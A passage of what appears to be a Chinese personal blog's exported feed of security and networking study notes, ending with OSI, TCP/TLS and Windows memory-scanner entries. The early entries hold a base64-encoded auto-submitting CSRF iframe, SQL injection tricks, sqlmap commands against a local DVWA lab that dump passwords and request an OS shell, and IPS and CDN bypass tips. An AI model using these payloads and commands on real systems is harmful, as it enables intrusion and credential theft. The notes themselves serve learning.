       <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg=="</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> 
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p>2、非空referer</p>
<p>不断尝试，如果后端只验证referer中是否存在指定关键字，那么我们通过新建文件夹使文件夹名为该域名，文件夹下存放csrf攻击代码即可</p>
<h3 id="SSRF"><a class="header-anchor" href="#SSRF"></a>SSRF</h3>
<h4 id="XXE漏洞"><a class="header-anchor" href="#XXE漏洞"></a>XXE漏洞</h4>
<p>SSRF（服务器端请求伪造）是一种攻击模式</p>
<p>XXE（XML External Entity XML外部实体）则是一种攻击手法</p>
<p>XXE漏洞利用了SSRF，让服务器向其他服务器应用请求XML外部实体（DTD文件）。</p>
<h4 id="RFI"><a class="header-anchor" href="#RFI"></a>RFI</h4>
<p>RFI（远程文件包含）也是SSRF的一种形式。</p>
<h3 id="SQLI"><a class="header-anchor" href="#SQLI"></a>SQLI</h3>
<p><strong>报错注入函数</strong></p>
<pre><code class="hljs plain">floor()
extractvalue()
updatexml()
exp()</code></pre>
<p><strong>order by 注入</strong></p>
<p>有些排序功能通过sql里的order by语句来实现，我们可以利用这一点，控制order by后面的内容</p>
<p>order by配合union进行盲注：通过排序结果逐字符比较得到结果</p>
<h2 id="常见安全工具"><a class="header-anchor" href="#常见安全工具"></a>常见安全工具</h2>
<h3 id="扫描工具"><a class="header-anchor" href="#扫描工具"></a>扫描工具</h3>
<ul>
<li>
<p>AWVS</p>
</li>
<li>
<p>NESSUS</p>
</li>
</ul>
<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">启动nessus</span>
service nessusd start
firefox https://localhost:8834

<span class="hljs-meta">#</span><span class="bash">找回用户名密码</span>
cd /opt/nessus/sbin/
./nessuscli lsuser
./nessuscli chpasswd [username]</code></pre>
<ul>
<li>nmap</li>
</ul>
<pre><code class="hljs plain">&#x2F;&#x2F;扫描C段
nmap 192.168.233.1&#x2F;24
&#x2F;&#x2F;根据IP地址范围扫描
nmap 192.168.1-10.128-140
&#x2F;&#x2F;扫描多个目标
nmap 192,168.233.1 192.168.23.128

&#x2F;&#x2F;参数
-p(小写)	指定端口
-O、-A	探测操作系统
-T	超时时间</code></pre>
<ul>
<li>sqlmap</li>
</ul>
<pre><code class="hljs plain">sqlmap.py -u &quot;http:&#x2F;&#x2F;......&quot; -p 可变的参数（如id等） --cookie &quot;......&quot; 

&#x2F;&#x2F;当前用户 --current-user
&#x2F;&#x2F;当前数据库 --current-db
sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA-1.9&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; -p &quot;id&quot; --cookie &quot;security&#x3D;low;PHPSESSID&#x3D;ke78jnt9j7mts8te23v69u4nh4&quot; --current-user --current-db

&#x2F;&#x2F;-D指定数据库 然后--tables查询表
sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA-1.9&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; -p &quot;id&quot; --cookie &quot;security&#x3D;low;PHPSESSID&#x3D;ke78jnt9j7mts8te23v69u4nh4&quot; -D &quot;dvwa&quot; --tables

&#x2F;&#x2F;-D -T指定数据库和表 然后--columns查询列
sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA-1.9&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; -p &quot;id&quot; --cookie &quot;security&#x3D;low;PHPSESSID&#x3D;ke78jnt9j7mts8te23v69u4nh4&quot; -D &quot;dvwa&quot; -T &quot;users&quot; --columns

&#x2F;&#x2F;-C指定列然后--dump出结果
sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA-1.9&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; -p &quot;id&quot; --cookie &quot;security&#x3D;low;PHPSESSID&#x3D;ke78jnt9j7mts8te23v69u4nh4&quot; -D &quot;dvwa&quot; -T &quot;users&quot; -C &quot;user,password&quot; --dump

&#x2F;&#x2F;get WebShell
sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA-1.9&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; -p &quot;id&quot; --cookie &quot;security&#x3D;low;PHPSESSID&#x3D;ke78jnt9j7mts8te23v69u4nh4&quot; -D &quot;dvwa&quot; -T &quot;users&quot; -C &quot;user,password&quot; --os-shell</code></pre>
<h3 id="安全设备"><a class="header-anchor" href="#安全设备"></a>安全设备</h3>
<h4 id="WAF"><a class="header-anchor" href="#WAF"></a>WAF</h4>
<ul>
<li>本地WAF
<ul>
<li>modSecurity
<ul>
<li>作为nginx的模块，需要编译安装</li>
</ul>
</li>
<li>…</li>
</ul>
</li>
<li>云WAF
<ul>
<li>无需用户更新</li>
<li>成本低</li>
<li>阿里云WAF…</li>
</ul>
</li>
<li>部署方式
<ul>
<li>反向代理
<ul>
<li>正向代理隐藏真实客户端，反向代理隐藏真实服务端</li>
</ul>
</li>
<li>步骤
<ul>
<li>购买阿里云WAF产品</li>
<li>在阿里云WAF中添加域名</li>
<li>在服务器中设置防火墙放行来自WAF的流量</li>
<li>修改DNS解析</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="蜜罐"><a class="header-anchor" href="#蜜罐"></a>蜜罐</h4>
<p>Github 开源蜜罐 —— HFish</p>
<p>安装包https://github.com/hacklcx/HFish/releases</p>
<p>安装成功后启动服务即可</p>
<p>蜜罐的作用</p>
<ul>
<li>获取攻击者IP、攻击过程等信息</li>
<li>溯源取证（jsonp获取攻击者cookie…</li>
</ul>
<h4 id="IPS-IDS"><a class="header-anchor" href="#IPS-IDS"></a>IPS/IDS</h4>
<p>入侵防御系统 / 入侵检测系统。IDS工作在网络层旁路，IPS则可旁路可串结（出口/入口）。IDS只能检测，IPS则是具备截断能力的IDS。</p>
<p>IPS的旁路防护原理很简单，其经典代表如开源的Snort，就是在网络上分析流量，发现符合规则的流量则冒充服务端回包响应客户端实现阻断或者替换的目的，这是一种典型的链路劫持手法。</p>
<p><strong>绕过方法</strong></p>
<p>TCP分片、IP分片等</p>
<p><a href="https://dawnyh99.github.io/2021/03/08/%E8%BF%90%E7%BB%B4/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94&amp;Linux%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/">https://dawnyh99.github.io/2021/03/08/运维/应急响应&amp;Linux入侵检测/</a>)</p>
<h4 id="态势感知平台"><a class="header-anchor" href="#态势感知平台"></a>态势感知平台</h4>
<p>多种防护系统、流量监测系统的接入整合及可视化，监控全局流量，攻击事件告警等</p>
<h2 id="常见网络技术"><a class="header-anchor" href="#常见网络技术"></a>常见网络技术</h2>
<h3 id="CDN"><a class="header-anchor" href="#CDN"></a>CDN</h3>
<p>CDN是一个分布式边缘网络，网站A使用了CDN，用户根据域名访问网站A时，如果用户本地DNS没有网站A的路由信息，则向DNS授权服务器请求网站A的IP地址，而DNS授权服务器则根据用户的位置，选择速度最快的CDN加速节点的IP地址传回给用户，那么用户即访问了该CDN节点，而非源站。当CDN节点中没有缓存源站的部分内容时，则会向源站请求。</p>
<p><strong>判断目标网站是否使用CDN</strong></p>
<ul>
<li>使用多地ping该网站域名，若得到的IP不同，则其可能使用了CDN</li>
<li>nslookup返回的域名解析对应多个IP多半是使用了CDN</li>
</ul>
<p><strong>绕过CDN获取网站真实IP</strong></p>
<ul>
<li>DNS缓存历史查询网站</li>
<li>网络空间搜索引擎
<ul>
<li>fofa</li>
<li>钟馗之眼</li>
<li>…</li>
</ul>
</li>
<li>查询子域名IP，可能子站并没有做CDN，可能与主站处于同一C段</li>
</ul>
]]></content>
      <categories>
        <category>蓝队技术</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>OSI模型</title>
    <url>/2020/08/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/OSI%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="OSI-模型"><a class="header-anchor" href="#OSI-模型"></a>OSI 模型</h2>
<h3 id="应用层"><a class="header-anchor" href="#应用层"></a>应用层</h3>
<p>能产生数据流量的并且能与用户交互的程序</p>
<p>记事本不是，因为不能产生数据流量</p>
<h3 id="表示层"><a class="header-anchor" href="#表示层"></a>表示层</h3>
<p>传递消息的语法和语义（不同内部数据表示法 编码方法 压缩 加密）</p>
<h3 id="会话层"><a class="header-anchor" href="#会话层"></a>会话层</h3>
<p>对话控制（记录该由谁来发送数据）</p>
<p>令牌管理（禁止双方同时执行同一关键操作）</p>
<p>同步功能（设置断点，崩溃恢复）</p>
<h3 id="传输层"><a class="header-anchor" href="#传输层"></a>传输层</h3>
<p>真正的端到端的层。解决的问题：<strong>进程与进程之间传输</strong>、识别进程</p>
<h3 id="网络层"><a class="header-anchor" href="#网络层"></a>网络层</h3>
<p>控制子网的运行 ，如何将数据包从源端路由到接收方。解决的问题：<strong>路由</strong>、<strong>拥塞控制</strong>、<strong>异构网络互联</strong></p>
<h3 id="数据链路层"><a class="header-anchor" href="#数据链路层"></a>数据链路层</h3>
<p>将一个原始的传输设施转变成一条没有漏检传输错误的线路。解决的问题：数据帧、流量控制、信道共享</p>
<h3 id="物理层"><a class="header-anchor" href="#物理层"></a>物理层</h3>
<p>关注在一条通信信道中传输原始比特。解决的问题：1，0的表示、比特维持时间、是否双向同时传输、连接建立，撤销、物理传输介质等</p>
<p><img src="/2020/08/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/OSI%E6%A8%A1%E5%9E%8B/image-20200801114821400.png" class="lazy" data-srcset="/2020/08/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/OSI%E6%A8%A1%E5%9E%8B/image-20200801114821400.png" srcset="/images/loadingImage.gif" alt="image-20200801114821400"></p>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>TCP&amp;IP</title>
    <url>/2021/03/14/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/TCP&amp;IP/</url>
    <content><![CDATA[<h2 id="TCP"><a class="header-anchor" href="#TCP"></a>TCP</h2>
<h3 id="三次握手和四次挥手"><a class="header-anchor" href="#三次握手和四次挥手"></a>三次握手和四次挥手</h3>
<p>TCP是可靠的，面向连接的传输层协议，端到端之间要进行TCP通信首先就要建立起TCP连接，当通信结束时断开TCP连接。这里TCP连接的建立与断开过程就分别由<code>三次握手</code>和<code>四次挥手</code>来完成。</p>
<ul>
<li>
<p>三次握手</p>
<p>TCP连接是通过三次握手进行初始化的。三次握手的目的是同步连接双方的序列号和确认号并交换 TCP窗口大小信息。具体过程如下图所示。</p>
<p><img src="/2021/03/14/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/TCP&IP/image-20210316191610581.png" class="lazy" data-srcset="/2021/03/14/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/TCP&IP/image-20210316191610581.png" srcset="/images/loadingImage.gif" alt="image-20210316191610581"></p>
<p><strong>第一次握手：</strong> 建立连接。客户端发送连接请求报文段，SYN位置为1，Sequence Number为随机数<code>i</code>；然后，客户端进入SYN_SENT状态，等待服务器的确认；</p>
<p><strong>第二次握手：</strong> 服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为<code>i+1</code> ( Sequence Number+1 )；同时，自己自己还要发送SYN请求信息，SYN设置为1，Sequence Number为<code>j</code>；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RCVD状态；</p>
<p><strong>第三次握手：</strong> 客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为<code>j+1</code>，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。</p>
<p>在wireshark中可以分别查看<code>ACK</code>和<code>Seq</code>的实际值和相对值，第一个包的Seq相对值为0。</p>
<p><strong><code>Seq</code>的相对值为当前端已发送的TCP总段长，<code>ACK</code>的相对值为当前端已接收的TCP总段长（单位：字节），</strong><code>SYN</code>标志位和<code>FIN</code>标志位也要占1字节（其他标志位如ACK不占）。</p>
</li>
<li>
<p>四次挥手</p>
<img src="/2021/03/14/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/TCP&IP/image-20210316213743223.png" class="lazy" data-srcset="/2021/03/14/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/TCP&IP/image-20210316213743223.png" srcset="/images/loadingImage.gif" style="zoom:50%;">
<p><strong>中断连接端可以是Client端，也可以是Server端。</strong></p>
<p>假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说&quot;我Client端没有数据要发给你了&quot;，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，“告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，“告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，&quot;就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，“就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p>
</li>
</ul>
<h3 id="TCP和UDP的对比"><a class="header-anchor" href="#TCP和UDP的对比"></a>TCP和UDP的对比</h3>
<p>有连接/无连接（可靠/不可靠）</p>
<p>有拆分合并/无拆分合并</p>
<p>有拥塞控制/无拥塞控制（发送速率的调整）</p>
<p>单播/多播</p>
<h3 id="滑动窗口和流量控制"><a class="header-anchor" href="#滑动窗口和流量控制"></a>滑动窗口和流量控制</h3>
<h3 id="拥塞控制"><a class="header-anchor" href="#拥塞控制"></a>拥塞控制</h3>
<h2 id="http-https"><a class="header-anchor" href="#http-https"></a>http/https</h2>
<h3 id="http各版本区别"><a class="header-anchor" href="#http各版本区别"></a>http各版本区别</h3>
<p>http1.0 vs http1.1</p>
<p>http1.1开始，默认使用长连接（HTTP协议的长连接和短连接，实质上是TCP协议的长连接和短连接。）</p>
<p>http1.1增加了一些错误状态码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。</p>
<h3 id="SSL-TLS"><a class="header-anchor" href="#SSL-TLS"></a>SSL/TLS</h3>
<ul>
<li>首先由客户端发送Client Hello 消息到服务器，消息中主要包含了客户端支持的<code>ciphersuites</code>， TLS 版本信息和客户端随机数。<strong>注意此时是明文传输</strong></li>
<li>服务器接收到消息后，返回自己支持的<code>ciphersuites</code>， TLS 版本，<strong>自己的数字证书</strong>和服务器端生成的随机数。<strong>注意此时是明文传输</strong></li>
<li>客户端开始验证数字证书，可能会不断往上追溯 CA、CA 的 CA、CA 的 CA 的 CA，直到一个受信的 CA。验证完证书之后生成一个新的<code>pre-master key</code>，再使用证书中的公钥来对<code>pre-master key</code>进行加密，然后发送给服务器。<strong>注意此时是非对称加密传输</strong></li>
<li>服务器接收到客户端发送过来的非对称加密的密文，使用自己的私钥进行解密，获得了<code>pre-master key</code>。<strong>注意此时是非对称加密传输</strong></li>
<li>到这里为止，服务器和客户端都有三组数字，**分别是客户端的随机数、服务器的随机数和pre-master key。**其中由于客户端的随机数和服务器的随机数都是使用明文传输，所以这两个数字是有被暴露的风险的，但是由于<code>pre-master key</code>是使用非对称加密传输，十分安全，所以将这三者结合，使用之前协商好的特定的算法就可以生成一个密钥，这个密钥称为<code>shared secert</code>。也就是之后用来对称加密的密钥。</li>
<li>客户端在计算出对称加密的密钥之后，使用该密钥进行对称加密通信，告知服务器之后都使用该密钥进行对称加密。<strong>注意此时是对称加密传输</strong></li>
<li>服务器接收到密文后，使用之前计算出的密钥来进行对称解密，解密成功之后，再使用该密钥进行对称加密通信。告知客户端密钥确认无误，可以使用该密钥进行通信。<strong>注意此时是对称加密传输</strong></li>
<li>至此，整个TLS的握手过程完整，之后就可以开始对称加密的通信了。</li>
</ul>
<h2 id="参考文章"><a class="header-anchor" href="#参考文章"></a>参考文章</h2>
<ul>
<li><a href="https://blog.csdn.net/whuslei/article/details/6667471">TCP协议中的三次握手和四次挥手(图解)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/72587882">关于 TCP/IP，必知必会的10个问题</a></li>
</ul>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows内存扫描器的设计和实现</title>
    <url>/2020/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="程序目标"><a class="header-anchor" href="#程序目标"></a>程序目标</h2>
<ol>
<li>利用Windows系统提供的接口读取内存数据；</li>
<li>对获取的数据进行分析，包括内存结构、进程链表、页目录表结构和进程信息；</li>
<li>实现物理内存内容的定位功能，能快速回到物理内存的起始地址或结束地址；</li>
<li>实现物理内存数据修改功能，并展示内存数据修改后的结果；</li>
</ol>
<h2 id="总体设计"><a class="header-anchor" href="#总体设计"></a>总体设计</h2>
<p>程序预期包含四个功能，每个功能由一个程序模块实现。如下图，程序运行时首先调用<code>getSystemInfo</code>函数获取系统及内存基本信息，再执行<code>getProcessInfo</code>函数获取当前正在运行的所有进程及其对应pid，用户输入进程pid选择要扫描的进程后，调用<code>getMemoryBlock</code>扫描该进程使用的内存，逐一打印内存块信息（起始地址、内存块大小、内存块状态、访问权限等），打印完成后用户选择查询内存内容或者修改内存内容，这两个功能分别由<code>SearchProcessMemory</code>和<code>ModifyProcessMemory</code>实现。</p>
<p><img src="/2020/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps1.jpg" class="lazy" data-srcset="/2020/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps1.jpg" srcset="/images/loadingImage.gif" alt="img"></p>
<h2 id="详细设计与实现"><a class="header-anchor" href="#详细设计与实现"></a>详细设计与实现</h2>
<h3 id="数据结构设计"><a class="header-anchor" href="#数据结构设计"></a>数据结构设计</h3>
<p>SYSTEM_INFO（操作系统信息）</p>
<pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SYSTEM_INFO</span> &#123;</span>
    __C89_NAMELESS <span class="hljs-keyword">union</span> &#123;
      DWORD dwOemId;
      __C89_NAMELESS <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>
  WORD wProcessorArchitecture;
  WORD wReserved;
      &#125; DUMMYSTRUCTNAME;
    &#125; DUMMYUNIONNAME;
    DWORD dwPageSize;					<span class="hljs-comment">//页面大小</span>
    LPVOID lpMinimumApplicationAddress;	<span class="hljs-comment">//进程用户区起始地址</span>
    LPVOID lpMaximumApplicationAddress;	<span class="hljs-comment">//进程用户区上界</span>
    DWORD_PTR dwActiveProcessorMask;
    DWORD dwNumberOfProcessors;
    DWORD dwProcessorType;
    DWORD dwAllocationGranularity;
    WORD wProcessorLevel;
    WORD wProcessorRevision;
  &#125; SYSTEM_INFO;</code></pre>
<p>MEMORYSTATUS（内存统计信息）</p>
<pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">MEMORYSTATUS</span> &#123;</span>
    DWORD dwLength;			<span class="hljs-comment">//MEMORYSTATUS结构的大小</span>
    DWORD dwMemoryLoad;		<span class="hljs-comment">//物理内存使用率</span>
    SIZE_T dwTotalPhys;		<span class="hljs-comment">//总物理内存</span>
    SIZE_T dwAvailPhys;		<span class="hljs-comment">//可用物理内存</span>
    SIZE_T dwTotalPageFile;	<span class="hljs-comment">//总页面文件大小</span>
    SIZE_T dwAvailPageFile;	<span class="hljs-comment">//可用页面文件大小</span>
    SIZE_T dwTotalVirtual;	<span class="hljs-comment">//总虚拟内存</span>
    SIZE_T dwAvailVirtual;	<span class="hljs-comment">//可用虚拟内存</span>
  &#125; MEMORYSTATUS</code></pre>
<p>PROCESSENTRY32（进程快照信息），用于获取正在运行的所有进程的信息</p>
<pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tagPROCESSENTRY32</span></span>
<span class="hljs-class">&#123;</span>
    DWORD dwSize;	<span class="hljs-comment">//结构体大小</span>
    DWORD cntUsage;	
    DWORD th32ProcessID;	<span class="hljs-comment">//进程ID</span>
    ULONG_PTR th32DefaultHeapID;
    DWORD th32ModuleID;
    DWORD cntThreads;	<span class="hljs-comment">//线程数</span>
    DWORD th32ParentProcessID;
    LONG pcPriClassBase;
    DWORD dwFlags;
    TCHAR szExeFile[MAX_PATH];	<span class="hljs-comment">//进程名称</span>
&#125; PROCESSENTRY32;</code></pre>
<p>MEMORY_BASIC_INFORMATION32（内存块信息）</p>
<pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">MEMORY_BASIC_INFORMATION32</span> &#123;</span>
    <span class="hljs-comment">//指向页面区域基地址的指针  </span>
    DWORD BaseAddress;	
    <span class="hljs-comment">//指向VirtualAlloc函数分配的页面范围的基地址的指针。BaseAddress成员指向的页面包含在此分配范围内</span>
    DWORD AllocationBase;
    <span class="hljs-comment">//最初分配区域时的内存保护选项。该成员可以是内存保护常量之一，如果调用者没有访问权限，则该成员可以为0</span>
    DWORD AllocationProtect;
    <span class="hljs-comment">//从所有页具有相同属性的基地址开始的区域大小</span>
    DWORD RegionSize;
    <span class="hljs-comment">//区域中页面的状态，有MEM_COMMIT、MEM_FREE、MEM_RESERVE三种可能</span>
    DWORD State;
    <span class="hljs-comment">//区域中页面的访问保护。该成员是为AllocationProtect成员列出的值之一。</span>
    DWORD Protect;
    <span class="hljs-comment">//区域中页面的类型，有MEM_IMAGE、MEM_MAPPED、MEM_PRIVATE三种可能</span>
    DWORD Type;
&#125; MEMORY_BASIC_INFORMATION32;</code></pre>
<h3 id="程序模块设计"><a class="header-anchor" href="#程序模块设计"></a>程序模块设计</h3>
<h4 id="getSystemInfo"><a class="header-anchor" href="#getSystemInfo"></a>getSystemInfo</h4>
<p><code>GetSystemInfo(LPSYSTEM_INFO lpSystemInfo)</code>、<code>GlobalMemoryStatus(LPMEMORYSTATUS lpBuffer)</code>两个Windows提供的API可以分别获取系统信息和系统内存信息，在该模块中只要调用两个API后再打印结构体信息即可。</p>
<h4 id="getProcessInfo"><a class="header-anchor" href="#getProcessInfo"></a>getProcessInfo</h4>
<p>首先调用<code>CreateToolhelp32Snapshot</code>函数获取进程列表快照的句柄，然后遍历进程快照，轮流显示每个进程的信息（PID、进程名、线程数等）。</p>
<h4 id="getMemoryBlock"><a class="header-anchor" href="#getMemoryBlock"></a>getMemoryBlock</h4>
<p>调用<code>OpenProcess()</code>获取想要访问的进程的句柄，循环调用<code>VirtualQueryEx()</code>函数，将返回的<code>MEMORY_BASIC_INFORMATION</code>数据结构保存到列表中，循环遍历列表，打印各个内存块的基本信息。</p>
<h4 id="SearchProcessMemory"><a class="header-anchor" href="#SearchProcessMemory"></a>SearchProcessMemory</h4>
<p>循环遍历存有内存块信息的列表MemList，选择状态为<code>MEM_COMMIT</code>的内存块（这些内存块中的数据值是有效的），再通过<code>ReadProcessMemory()</code>访问该内存区域，遍历该区域，将值为我们查找的内容的内存地址加入列表AddrList。最后将AddList中的地址打印出来。</p>
<h4 id="ModifyProcessMemory"><a class="header-anchor" href="#ModifyProcessMemory"></a>ModifyProcessMemory</h4>
<p>首先通过<code>OpenProcess()</code>获取进程句柄，需要注意的是，在打开进程时要选择获取所有控制权限，否则可能因为权限过低而无法进行内存的修改。<code>VirtualProtectEx()</code>修改内存块的保护模式，然后通过<code>WriteProcessMemory()</code>写入内存块具体位置的值，最后再次调用<code>VirtualProtectEx()</code>还原内存块的保护模式。</p>
<h2 id="程序运行效果"><a class="header-anchor" href="#程序运行效果"></a>程序运行效果</h2>
<blockquote>
<p>运行环境：Windows 7 x64</p>
</blockquote>
<p>程序运行界面如图</p>
<p><img src="/2020/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps2.jpg" class="lazy" data-srcset="/2020/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps2.jpg" srcset="/images/loadingImage.gif" alt="img"></p>
<p><img src="/2020/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps3.jpg" class="lazy" data-srcset="/2020/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps3.jpg" srcset="/images/loadingImage.gif" alt="img"></p>
<p>我们选择要打开的进程，以helloworld测试程序test.exe（PID为1500）为例（系统进程所需权限较高，会打开失败）：</p>
<p><img src="/2020/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps4.jpg" class="lazy" data-srcset="/2020/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps4.jpg" srcset="/images/loadingImage.gif" alt="img"></p>
<p>可以看到，成功打开进程后，打印了进程使用的内存块信息，打印完成后选择要执行的功能。以下分别演示内存查询和内存修改。</p>
<p><img src="/2020/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps5.jpg" class="lazy" data-srcset="/2020/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps5.jpg" srcset="/images/loadingImage.gif" alt="img"></p>
<p>可以查到存储的值为123456的内存地址有四个。接下来将其中一个的值修改为234567.</p>
